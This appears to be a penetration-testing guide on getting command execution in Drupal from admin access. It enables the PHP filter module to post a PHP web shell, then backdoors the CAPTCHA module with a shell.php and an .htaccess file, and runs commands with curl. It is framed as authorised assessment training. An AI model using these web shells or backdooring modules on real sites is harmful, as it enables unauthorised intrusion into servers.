---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# Drupal Exploitation

## Abusing Modules

### PHP Filter Module

In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."

<figure><img src="../../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

From here, we could tick the check box next to the module and scroll down to `Save configuration`. Next, we could go to Content > Add content and create a `Basic page`.

<figure><img src="../../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

We can now create a page with a malicious PHP snippet such as the one below. We named the parameter with an md5 hash instead of the common `cmd` to get in the practice of not potentially leaving a door open to an attacker during our assessment. If we used the standard `system($_GET['cmd']);` we open up ourselves up to a "drive-by" attacker potentially coming across our web shell.

The `MD5` hash representation can originate from any hashed command or string that isn't easily guessable and is not present in any dictionary wordlists used for directory brute-forcing.

{% code title="PHP Web Shell" lineNumbers="true" %}
```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

We also want to make sure to set `Text format` drop-down to `PHP code`. Once saved, we can either request execute commands in the browser by appending `?dcfdd5e021a869fcc6dfaef8bf31377e=id` to the end of the URL to run the `id` command or use `cURL` on the command line. From here, we could use a bash one-liner to obtain reverse shell access.

{% code title="Command" %}
```bash
curl -s http://drupal.acme.com/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```
{% endcode %}

{% code title="Output" %}
```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
{% endcode %}

{% hint style="info" %}
## > Version 8

From version 8 onwards, the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module is not installed by default. To leverage this functionality, we would have to install the module ourselves. Since we would be changing and adding something to the client's Drupal instance, we may want to check with them first. We'd start by downloading the most recent version of the module from the Drupal website.
{% endhint %}

### Backdoored Module

Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the [drupal.org](https://new.drupal.org/home) website.

Pick a module such as [CAPTCHA](https://www.drupal.org/project/captcha). Scroll down and copy the link for the tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz). Download the archive and extract its contents.

{% code title="Download Module" %}
```bash
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
```
{% endcode %}

{% code title="Decompress Module Archive" %}
```bash
tar xvf captcha-8.x-1.2.tar.gz
```
{% endcode %}

Create a PHP web shell with the contents:

```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```

Next, we need to create a `.htaccess` file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the `/modules` folder.

{% code title=".htaccess" %}
```xml
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
{% endcode %}

The configuration above will apply rules for the `/` folder when we request a file in `/modules`. Copy both of these files to the captcha folder and create an archive.

```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```

Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.acme.com/admin/modules/install`. Browse to the backdoored Captcha archive and click `Install`.

Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.

```bash
curl -s drupal.acme.com/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```
